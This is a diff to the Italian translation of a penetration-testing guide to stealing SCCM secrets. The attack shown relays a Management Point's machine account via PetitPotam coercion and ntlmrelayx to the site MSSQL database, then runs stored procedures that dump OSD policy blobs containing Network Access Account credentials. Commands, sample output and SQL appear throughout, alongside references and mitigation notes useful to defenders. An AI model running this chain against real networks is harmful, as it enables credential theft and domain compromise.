@@ -1,15 +1,15 @@
-# Estrazione dei segreti della politica OSD tramite NTLM Relay del Punto di Gestione SCCM a SQL
+# Estrazione dei segreti della politica OSD tramite NTLM Relay del punto di gestione SCCM
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Costringendo un **Punto di Gestione (MP) di System Center Configuration Manager (SCCM)** ad autenticarsi tramite SMB/RPC e **rilasciando** quel conto macchina NTLM al **database del sito (MSSQL)** si ottengono diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli ti consentono di chiamare un insieme di procedure memorizzate che espongono i blob delle politiche di **Distribuzione del Sistema Operativo (OSD)** (credenziali dell'Account di Accesso alla Rete, variabili della Sequenza di Attività, ecc.). I blob sono codificati/encriptati in esadecimale ma possono essere decodificati e decrittografati con **PXEthief**, rivelando segreti in chiaro.
+Costringendo un **System Center Configuration Manager (SCCM) Management Point (MP)** ad autenticarsi tramite SMB/RPC e **rilasciando** quel NTLM machine account al **database del sito (MSSQL)** si ottengono diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli ti consentono di chiamare un insieme di procedure memorizzate che espongono i blob delle politiche di **Operating System Deployment (OSD)** (credenziali dell'Account di Accesso alla Rete, variabili della Sequenza di Attività, ecc.). I blob sono codificati/encriptati in esadecimale ma possono essere decodificati e decrittografati con **PXEthief**, restituendo segreti in chiaro.
 
 Catena ad alto livello:
 1. Scoprire MP & DB del sito ↦ endpoint HTTP non autenticato `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Avviare `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Costringere MP utilizzando **PetitPotam**, PrinterBug, DFSCoerce, ecc.
-4. Attraverso il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come l'account rilasciato **<DOMAIN>\\<MP-host>$**.
+4. Attraverso il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come account **<DOMAIN>\\<MP-host>$** rilasciato.
 5. Eseguire:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -25,9 +25,9 @@ L'estensione ISAPI MP **GetAuth.dll** espone diversi parametri che non richiedon
 
 | Parametro | Scopo |
 |-----------|-------|
-| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + GUID dei dispositivi **Tutti i Computer Sconosciuti** *x86* / *x64*. |
-| `MPLIST` | Elenca ogni Punto di Gestione nel sito. |
-| `SITESIGNCERT` | Restituisce il certificato di firma del Sito Primario (identifica il server del sito senza LDAP). |
+| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + GUID dei dispositivi **All Unknown Computers** *x86* / *x64*. |
+| `MPLIST` | Elenca ogni Management-Point nel sito. |
+| `SITESIGNCERT` | Restituisce il certificato di firma del sito primario (identifica il server del sito senza LDAP). |
 
 Prendi i GUID che fungeranno da **clientID** per le query DB successive:
 ```bash
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Quando la coercizione si attiva, dovresti vedere qualcosa del genere:
+Quando la coercizione si attiva, dovresti vedere qualcosa di simile a:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -58,14 +58,14 @@ proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
 Passa al DB **CM_<SiteCode>** (usa il codice sito di 3 cifre, ad esempio `CM_001`).
 
-### 3.1 Trova GUID di Computer Sconosciuti (opzionale)
+### 3.1  Trova GUID di Computer Sconosciuti (opzionale)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Elenca le politiche assegnate
+### 3.2 Elenca le politiche assegnate
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -81,7 +81,7 @@ Se hai già `PolicyID` e `PolicyVersion`, puoi saltare il requisito del clientID
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> IMPORTANTE: In SSMS aumentare "Caratteri Massimi Recuperati" (>65535) o il blob verrà troncato.
+> IMPORTANTE: In SSMS aumentare "Massimo caratteri recuperati" (>65535) o il blob verrà troncato.
 
 ---
 
@@ -137,11 +137,13 @@ stesse mitigazioni utilizzate contro `PetitPotam`/`PrinterBug`).
 
 ## Vedi anche
 * Fondamenti del relay NTLM:
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * Abuso di MSSQL e post-exploitation:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
@@ -149,7 +151,7 @@ abusing-ad-mssql.md
 
 
 ## Riferimenti
-- [Vorrei parlare con il tuo manager: Rubare segreti con i Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Vorrei parlare con il tuo manager: Rubare segreti con i relay dei punti di gestione](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [Gestore di Misconfigurazioni – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
